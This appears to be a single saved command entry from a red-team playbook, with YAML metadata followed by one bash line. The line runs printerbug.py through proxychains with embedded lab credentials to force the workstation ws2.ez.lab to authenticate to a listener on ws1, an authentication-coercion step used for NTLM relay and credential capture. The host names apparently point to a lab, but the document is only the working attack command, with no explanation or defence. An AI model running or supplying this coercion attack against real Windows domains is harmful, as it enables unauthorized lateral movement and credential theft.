---
id: a65180fb-9f3b-43a5-b9a8-4d1c046f7297
name: Execute printer bug to trigger authentication from target workstation
type: command
executor: bash
data: proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
output: null
created_at: '2023-04-06T03:56:06.310923+00:00'
updated_at: '2023-04-10T20:26:05.079234+00:00'
---

# Execute printer bug to trigger authentication from target workstation

```bash
proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
```


